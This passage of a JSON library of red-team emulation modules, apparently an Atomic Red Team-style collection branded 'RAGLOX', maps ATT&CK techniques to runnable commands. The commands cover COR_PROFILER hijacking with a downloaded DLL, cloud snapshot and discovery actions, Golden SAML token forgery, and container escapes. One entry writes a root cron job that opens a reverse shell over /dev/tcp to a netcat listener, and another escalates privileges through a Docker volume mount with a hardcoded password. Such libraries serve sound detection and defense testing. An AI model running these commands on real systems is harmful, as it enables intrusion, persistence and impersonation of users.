        "cleanup_command": "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n"
      },
      "variables": [
        {
          "name": "file_name",
          "description": "unmanaged profiler DLL",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1574.012\\bin\\T1574.012x64.dll"
        },
        {
          "name": "clsid_guid",
          "description": "custom clsid guid",
          "type": "string",
          "default_value": "{09108e71-974c-4010-89cb-acf471ae9e2c}"
        }
      ],
      "prerequisites": [
        {
          "description": "\"#{file_name}\" must be present\n",
          "check_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"
        }
      ],
      "rx_module_id": "f373b482-48c8-4ce4-85ed-d40c8b3f7310",
      "module_name": "System Scope COR_PROFILER"
    },
    {
      "index": 1709,
      "technique_id": "T1574.012",
      "technique_name": "Hijack Execution Flow: COR_PROFILER",
      "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '#{clsid_guid}'\n$env:COR_PROFILER_PATH = '\"#{file_name}\"'\nPOWERSHELL -c 'Start-Sleep 1'\n",
        "elevation_required": false,
        "cleanup_command": "$env:COR_ENABLE_PROFILING = 0\n$env:COR_PROFILER = ''\n$env:COR_PROFILER_PATH = ''\n"
      },
      "variables": [
        {
          "name": "file_name",
          "description": "unamanged profiler DLL",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1574.012\\bin\\T1574.012x64.dll"
        },
        {
          "name": "clsid_guid",
          "description": "custom clsid guid",
          "type": "string",
          "default_value": "{09108e71-974c-4010-89cb-acf471ae9e2c}"
        }
      ],
      "prerequisites": [
        {
          "description": "\"#{file_name}\" must be present\n",
          "check_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"
        }
      ],
      "rx_module_id": "79d57242-bbef-41db-b301-9d01d9f6e817",
      "module_name": "Registry-free process scope COR_PROFILER"
    },
    {
      "index": 1710,
      "technique_id": "T1578.001",
      "technique_name": "Modify Cloud Compute Infrastructure: Create Snapshot",
      "description": "Creates an EBS snapshot in AWS using the AWS CLI.\nThis simulates an adversary duplicating volume data via snapshots for persistence or exfiltration.\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description \"RAGLOX Threat Library Test Snapshot\" --query \"SnapshotId\" --output text\n",
        "elevation_required": false,
        "cleanup_command": "SNAPSHOT_ID=$(aws ec2 describe-snapshots --region #{aws_region} --filters \"Name=volume-id,Values=#{aws_volume_id}\" --query \"Snapshots[0].SnapshotId\" --output text)\nif [ \"$SNAPSHOT_ID\" != \"None\" ]; then\n  aws ec2 delete-snapshot --region #{aws_region} --snapshot-id \"$SNAPSHOT_ID\"\nfi\n"
      },
      "variables": [
        {
          "name": "aws_region",
          "description": "AWS region where the volume is located.",
          "type": "string",
          "default_value": "us-east-1"
        },
        {
          "name": "aws_volume_id",
          "description": "The AWS EBS Volume ID to create a snapshot from.",
          "type": "string",
          "default_value": "vol-0123456789abcdef0"
        }
      ],
      "prerequisites": [
        {
          "description": "AWS CLI must be installed.",
          "check_command": "if command -v aws > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
          "install_command": "echo \"Install AWS CLI: https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2.html\"\n"
        },
        {
          "description": "AWS CLI must be authenticated.",
          "check_command": "if aws sts get-caller-identity --region #{aws_region} > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
          "install_command": "echo \"Configure AWS credentials with: aws configure\"\n"
        },
        {
          "description": "EBS volume must exist.",
          "check_command": "if aws ec2 describe-volumes --volume-ids #{aws_volume_id} --region #{aws_region} > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
          "install_command": "echo \"Ensure the volume ID exists in the target AWS account and region.\"\n"
        }
      ],
      "rx_module_id": "a3c09662-85bb-4ea8-b15b-6dc8a844e236",
      "module_name": "AWS - Create Snapshot from EBS Volume"
    },
    {
      "index": 1711,
      "technique_id": "T1578.001",
      "technique_name": "Modify Cloud Compute Infrastructure: Create Snapshot",
      "description": "Creates a snapshot of a managed disk in Azure using the Azure CLI.\nSimulates adversary snapshotting behavior for persistence or data duplication.\n",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "sh",
        "command": "az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus\n",
        "elevation_required": false,
        "cleanup_command": "az snapshot delete --resource-group #{azure_resource_group} --name #{azure_snapshot_name}\n"
      },
      "variables": [
        {
          "name": "azure_resource_group",
          "description": "The Azure resource group where the disk is located.",
          "type": "string",
          "default_value": "myResourceGroup"
        },
        {
          "name": "azure_disk_name",
          "description": "The Azure disk name.",
          "type": "string",
          "default_value": "myDiskName"
        },
        {
          "name": "azure_snapshot_name",
          "description": "The Azure snapshot name.",
          "type": "string",
          "default_value": "mySnapshotName"
        }
      ],
      "prerequisites": [
        {
          "description": "Azure CLI must be installed.",
          "check_command": "if command -v az > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
          "install_command": "echo \"Install Azure CLI: https://learn.microsoft.com/en-us/cli/azure/install-azure-cli\"\n"
        },
        {
          "description": "Azure CLI must be authenticated.",
          "check_command": "if az account show > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
          "install_command": "echo \"Login with: az login\"\n"
        },
        {
          "description": "Azure disk must exist.",
          "check_command": "if az disk show --resource-group #{azure_resource_group} --name #{azure_disk_name} > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
          "install_command": "echo \"Ensure the disk exists in the given resource group.\"\n"
        }
      ],
      "rx_module_id": "89e69b4b-3458-4ec6-b819-b3008debc1bc",
      "module_name": "Azure - Create Snapshot from Managed Disk"
    },
    {
      "index": 1712,
      "technique_id": "T1578.001",
      "technique_name": "Modify Cloud Compute Infrastructure: Create Snapshot",
      "description": "Creates a snapshot of a persistent disk in GCP using the gcloud CLI.\nEmulates adversary behavior to gain access to volume data or replicate environment state.\n",
      "execution": {
        "platforms": [
          "iaas:gcp"
        ],
        "executor_type": "sh",
        "command": "gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone}\n",
        "elevation_required": false,
        "cleanup_command": "gcloud compute snapshots delete #{gcp_snapshot_name} --quiet\n"
      },
      "variables": [
        {
          "name": "gcp_disk_name",
          "description": "The Google Cloud disk name.",
          "type": "string",
          "default_value": "myDiskName"
        },
        {
          "name": "gcp_zone",
          "description": "The Google Cloud zone where the disk is located.",
          "type": "string",
          "default_value": "us-central1-a"
        },
        {
          "name": "gcp_snapshot_name",
          "description": "The Google Cloud snapshot name.",
          "type": "string",
          "default_value": "mySnapshotName"
        }
      ],
      "prerequisites": [
        {
          "description": "gcloud CLI must be installed.",
          "check_command": "if command -v gcloud > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
          "install_command": "echo \"Install gcloud CLI: https://cloud.google.com/sdk/docs/install\"\n"
        },
        {
          "description": "gcloud CLI must be authenticated.",
          "check_command": "if gcloud auth list --filter=status:ACTIVE --format=\"value(account)\" | grep . > /dev/null; then exit 0; else exit 1; fi\n",
          "install_command": "echo \"Authenticate with: gcloud auth login\"\n"
        },
        {
          "description": "GCP disk must exist.",
          "check_command": "if gcloud compute disks describe #{gcp_disk_name} --zone=#{gcp_zone} > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
          "install_command": "echo \"Ensure the disk exists in the specified zone.\"\n"
        }
      ],
      "rx_module_id": "e6fbc036-91e7-4ad3-b9cb-f7210f40dd5d",
      "module_name": "GCP - Create Snapshot from Persistent Disk"
    },
    {
      "index": 1713,
      "technique_id": "T1580",
      "technique_name": "Cloud Infrastructure Discovery",
      "description": "This raglox runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This RAGLOX module leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/\n",
      "execution": {
        "platforms": [
          "linux",
          "macos",
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "export AWS_REGION=#{aws_region}\ncd #{stratus_path}\necho \"Stratus: Start Warmup.\"\n./stratus warmup aws.discovery.ec2-enumerate-from-instance\necho \"Stratus: Start Detonate.\"\n./stratus detonate aws.discovery.ec2-enumerate-from-instance\n",
        "elevation_required": false,
        "cleanup_command": "cd #{stratus_path}\necho \"Stratus: Start Cleanup.\"\n./stratus cleanup aws.discovery.ec2-enumerate-from-instance\necho \"Removing Stratus artifacts from local machine.\"\nrm -rf stratus*\n"
      },
      "variables": [
        {
          "name": "stratus_path",
          "description": "Path of stratus binary",
          "type": "path",
          "default_value": "$PathToRagloxModulesFolder/T1580/src"
        },
        {
          "name": "aws_region",
          "description": "AWS region to detonate",
          "type": "string",
          "default_value": "us-west-2"
        }
      ],
      "prerequisites": [
        {
          "description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
          "check_command": "if test -f \"#{stratus_path}/stratus\"; then exit 0; else exit 1; fi\n",
          "install_command": "if [ \"$(uname)\" = \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi \n"
        },
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo \"Please install the aws-cli and configure your AWS default profile using: aws configure\"\n"
        }
      ],
      "rx_module_id": "99ee161b-dcb1-4276-8ecb-7cfdcb207820",
      "module_name": "AWS - EC2 Enumeration from Cloud Instance"
    },
    {
      "index": 1714,
      "technique_id": "T1580",
      "technique_name": "Cloud Infrastructure Discovery",
      "description": "Simulate an attacker's action to enumerate EC2 Security Groups in a compromised AWS environment.",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "command_prompt",
        "command": "aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "aws_profile",
          "description": "AWS CLI profile name",
          "type": "string",
          "default_value": "default"
        },
        {
          "name": "output_format",
          "description": "Desired output format (text, table, json)",
          "type": "string",
          "default_value": "json"
        }
      ],
      "prerequisites": [
        {
          "description": "AWS CLI installed and configured with the necessary access rights.",
          "check_command": "type aws || aws --version",
          "install_command": "if [ \"$(uname)\" = \"Darwin\" ] || [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]; then\n  curl \"https://aws.amazon.com/cli/\" -o \"Install-AWSCLI.sh\" && sh Install-AWSCLI.sh\nelif [ \"$(expr substr $(uname) 1 5)\" = \"MINGW\" ]; then\n  Invoke-WebRequest -Uri \"https://aws.amazon.com/cli/\" -OutFile \"Install-AWSCLI.ps1\"; .\\Install-AWSCLI.ps1\nfi\n"
        },
        {
          "description": "Check if AWS CLI is installed and configured.",
          "check_command": "aws sts get-caller-identity --profile #{aws_profile}\n",
          "install_command": "if ! aws sts get-caller-identity --profile #{aws_profile}; then\n  echo \"AWS CLI not properly configured. Please configure AWS CLI.\"\nfi\n"
        }
      ],
      "rx_module_id": "99b38f24-5acc-4aa3-85e5-b7f97a5d37ac",
      "module_name": "AWS - EC2 Security Group Enumeration"
    },
    {
      "index": 1715,
      "technique_id": "T1592.001",
      "technique_name": "Gather Victim Host Information: Hardware",
      "description": "Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-CimInstance -Query \"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d430bf85-b656-40e7-b238-42db01df0183",
      "module_name": "Enumerate PlugNPlay Camera"
    },
    {
      "index": 1716,
      "technique_id": "T1595.003",
      "technique_name": "Active Scanning: Wordlist Scanning",
      "description": "This test will scan a target system with a wordlist of common directories and file paths.\n",
      "execution": {
        "platforms": [
          "windows",
          "linux",
          "macos"
        ],
        "executor_type": "powershell",
        "command": "Import-Module \"PathToRagloxModulesFolder/T1595.003/src/WebServerScan.ps1\"\nInvoke-WordlistScan -Target \"#{target}\" -Wordlist \"#{wordlist}\" -Timeout \"#{request_timeout}\" -OutputFile \"#{output_file}\"\nWrite-Host \"Scan complete. Results saved to: #{output_file}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target",
          "description": "The target system to scan",
          "type": "string",
          "default_value": "http://localhost"
        },
        {
          "name": "wordlist",
          "description": "The wordlist to use for scanning",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1595.003/src/wordlist.txt"
        },
        {
          "name": "request_timeout",
          "description": "The timeout for each request (in seconds)",
          "type": "integer",
          "default_value": 5
        },
        {
          "name": "output_file",
          "description": "File to output results to",
          "type": "string",
          "default_value": "$env:TMPDIR/wordlist_scan.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "89a83c3e-0b39-4c80-99f5-c2aa084098bd",
      "module_name": "Web Server Wordlist Scan"
    },
    {
      "index": 1717,
      "technique_id": "T1606.002",
      "technique_name": "Forge Web Credentials: SAML token",
      "description": "Forge a \"Golden SAML\" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "certificate_path",
          "description": "Token signing certificate path. See T1552.004 to export it",
          "type": "path",
          "default_value": ".\\ADFS_signing.pfx"
        },
        {
          "name": "immutable_id",
          "description": "ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString \"username\").ImmutableId",
          "type": "string",
          "default_value": "aehgdqBTZV50DKQZmNJ8mg=="
        },
        {
          "name": "issuer_uri",
          "description": "Issuer URI of the ADFS service",
          "type": "string",
          "default_value": "http://contoso.com/adfs/services/trust/"
        }
      ],
      "prerequisites": [
        {
          "description": "AADInternals module must be installed.\n",
          "check_command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
          "install_command": "Install-Module -Name AADInternals -Force\n"
        }
      ],
      "rx_module_id": "b16a03bc-1089-4dcc-ad98-30fe8f3a2b31",
      "module_name": "Golden SAML"
    },
    {
      "index": 1718,
      "technique_id": "T1609",
      "technique_name": "Kubernetes Exec Into Container",
      "description": "Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (kubectl exec). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using kubectl exec.\n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "bash",
        "command": "kubectl create -f #{path} -n #{namespace}\n# wait 3 seconds for the instance to come up\nsleep 3\nkubectl exec -n #{namespace} busybox -- #{command}\n",
        "elevation_required": false,
        "cleanup_command": "kubectl delete pod busybox -n #{namespace}\n"
      },
      "variables": [
        {
          "name": "namespace",
          "description": "K8s namespace to use",
          "type": "string",
          "default_value": "default"
        },
        {
          "name": "command",
          "description": "Command to run",
          "type": "string",
          "default_value": "uname"
        },
        {
          "name": "path",
          "description": "Path to busybox.yaml file",
          "type": "string",
          "default_value": "$PathtoRAGLOX ModulesFolder/T1609/src/busybox.yaml"
        }
      ],
      "prerequisites": [
        {
          "description": "kubectl must be installed\n",
          "check_command": "which kubectl\n",
          "install_command": "echo \"kubectl must be installed manually\"\n"
        }
      ],
      "rx_module_id": "d03bfcd3-ed87-49c8-8880-44bb772dea4b",
      "module_name": "ExecIntoContainer"
    },
    {
      "index": 1719,
      "technique_id": "T1609",
      "technique_name": "Kubernetes Exec Into Container",
      "description": "Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (docker exec). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using docker exec. Kinsing (Golang-based malware) was executed with an Ubuntu container entry point that runs shell scripts.\n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "bash",
        "command": "docker build -t t1609  $PathtoRAGLOX ModulesFolder/T1609/src/ \ndocker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh\ndocker exec -i t1609_container bash -c \"cat /tmp/output.txt\"\n",
        "elevation_required": false,
        "cleanup_command": "docker stop t1609_container\ndocker rmi -f t1609:latest \n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "docker must be installed\n",
          "check_command": "which docker\n",
          "install_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
        }
      ],
      "rx_module_id": "900e2c49-221b-42ec-ae3c-4717e41e6219",
      "module_name": "Docker Exec Into Container"
    },
    {
      "index": 1720,
      "technique_id": "T1610",
      "technique_name": "Deploy a container",
      "description": "Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. They can do this using docker create and docker start commands. Kinsing & Doki was exploited using this technique. \n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "bash",
        "command": "docker build -t t1610 $PathtoRAGLOX ModulesFolder/T1610/src/\ndocker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh\n",
        "elevation_required": false,
        "cleanup_command": "docker stop t1610_container\ndocker rmi -f t1610:latest \n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Verify docker is installed.",
          "check_command": "which docker\n",
          "install_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
        },
        {
          "description": "Verify docker service is running.",
          "check_command": "sudo systemctl status docker  --no-pager\n",
          "install_command": "sudo systemctl start docker\n"
        }
      ],
      "rx_module_id": "59aa6f26-7620-417e-9318-589e0fb7a372",
      "module_name": "Deploy Docker container"
    },
    {
      "index": 1721,
      "technique_id": "T1611",
      "technique_name": "Escape to Host",
      "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "sh",
        "command": "kubectl --context kind-raglox-cluster run raglox-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'\n",
        "elevation_required": false,
        "cleanup_command": "kubectl --context kind-raglox-cluster delete pod raglox-escape-pod\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Verify docker is installed.",
          "check_command": "which docker\n",
          "install_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
        },
        {
          "description": "Verify docker service is running.",
          "check_command": "sudo systemctl status docker\n",
          "install_command": "sudo systemctl start docker\n"
        },
        {
          "description": "Verify kind is in the path.",
          "check_command": "which kind\n",
          "install_command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind\n"
        },
        {
          "description": "Verify kind-raglox-cluster is created",
          "check_command": "sudo kind get clusters\n",
          "install_command": "sudo kind create cluster --name raglox-cluster\n"
        },
        {
          "description": "Verify kubectl is in path",
          "check_command": "which kubectl\n",
          "install_command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl\n"
        }
      ],
      "rx_module_id": "0b2f9520-a17a-4671-9dba-3bd034099fff",
      "module_name": "Deploy container using nsenter container escape"
    },
    {
      "index": 1722,
      "technique_id": "T1611",
      "technique_name": "Escape to Host",
      "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "sh",
        "command": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" > #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'\" >> #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2>&1\n",
        "elevation_required": true,
        "cleanup_command": "rm #{mount_point}#{cron_path}/#{cron_filename}\numount #{mount_point}\nrmdir #{mount_point}\n"
      },
      "variables": [
        {
          "name": "mount_device",
          "description": "Path to the device of the host's disk to mount",
          "type": "path",
          "default_value": "/dev/dm-0"
        },
        {
          "name": "mount_point",
          "description": "Path where the host filesystem will be mounted",
          "type": "path",
          "default_value": "/mnt/T1611.002"
        },
        {
          "name": "cron_path",
          "description": "Path on the host filesystem where cron jobs are stored",
          "type": "path",
          "default_value": "/etc/cron.d"
        },
        {
          "name": "cron_filename",
          "description": "Filename of the cron job in cron_path",
          "type": "string",
          "default_value": "T1611_002"
        },
        {
          "name": "listen_address",
          "description": "IP address to listen for callback from the host system.",
          "type": "string",
          "default_value": "`ifconfig eth0 | grep inet | awk '{print $2}'`"
        },
        {
          "name": "listen_port",
          "description": "TCP Port to listen on for callback from the host system.",
          "type": "integer",
          "default_value": 4444
        }
      ],
      "prerequisites": [
        {
          "description": "Verify mount is installed.",
          "check_command": "which mount\n",
          "install_command": "if [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi\n"
        },
        {
          "description": "Verify container is privileged.",
          "check_command": "capsh --print | grep cap_sys_admin\n",
          "install_command": "if [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n"
        },
        {
          "description": "Verify mount device (/dev/dm-0) exists.",
          "check_command": "ls #{mount_device}\n",
          "install_command": "if [ ! -f #{mount_device} ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n"
        },
        {
          "description": "Netcat is installed.",
          "check_command": "which netcat\n",
          "install_command": "if [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi\n"
        },
        {
          "description": "IP Address is known.",
          "check_command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi\n",
          "install_command": "if [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi\n"
        }
      ],
      "rx_module_id": "6c499943-b098-4bc6-8d38-0956fc182984",
      "module_name": "Mount host filesystem to escape privileged Docker container"
    },
    {
      "index": 1723,
      "technique_id": "T1611",
      "technique_name": "Escape to Host",
      "description": "This test demonstrates privilege escalation by abusing Docker's volume mapping\nfeature to gain access to the host file system. By mounting the root directory\nof the host into a Docker container, the attacker can use chroot to operate as\nroot on the host system.\n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "sh",
        "command": "echo \"Current user: #{username}\"\nsudo -u docker_user sh -c \"sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id\"\n",
        "elevation_required": true,
        "cleanup_command": "USERNAME=\"#{username}\"; SUDOERS_FILE=\"/etc/sudoers.d/$USERNAME\"; id \"$USERNAME\" &>/dev/null && userdel -r \"$USERNAME\" && echo -e \"$USERNAME is deleted.\"; [[ -f \"$SUDOERS_FILE\" ]] && rm -f \"$SUDOERS_FILE\"; echo \"Cleanup complete.\"\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username that run attack command",
          "type": "string",
          "default_value": "docker_user"
        }
      ],
      "prerequisites": [
        {
          "description": "Docker",
          "check_command": "command -v docker &> /dev/null && echo \"Docker is installed\" || { echo \"Docker is not installed.\"; exit 1; }\n",
          "install_command": "echo \"You should install docker manually.\"\n"
        },
        {
          "description": "Docker Privileged User",
          "check_command": "sudo -l -U #{username} | grep \"(ALL) NOPASSWD: /usr/bin/docker\"\n",
          "install_command": "USERNAME=\"#{username}\"\nPASSWORD=\"password123\"\nSUDO_COMMAND=\"/usr/bin/docker\"\nSUDOERS_FILE=\"/etc/sudoers.d/$USERNAME\"\n[[ $EUID -ne 0 ]] && echo \"Run as root.\" && exit 1; id \"$USERNAME\" &>/dev/null || { useradd -m -s /bin/bash \"$USERNAME\" && echo \"$USERNAME:$PASSWORD\" | chpasswd; }; [[ -f \"$SUDOERS_FILE\" ]] || { echo \"$USERNAME ALL=(ALL) NOPASSWD: $SUDO_COMMAND\" > \"$SUDOERS_FILE\" && chmod 440 \"$SUDOERS_FILE\"; }; echo \"Setup complete. User: $USERNAME, Password: $PASSWORD\"\n"
        }
      ],
      "rx_module_id": "39fab1bc-fcb9-406f-bc2e-fe03e42ff0e4",
      "module_name": "Privilege Escalation via Docker Volume Mapping"
    },
    {
      "index": 1724,
      "technique_id": "T1612",
      "technique_name": "Build Image on Host",
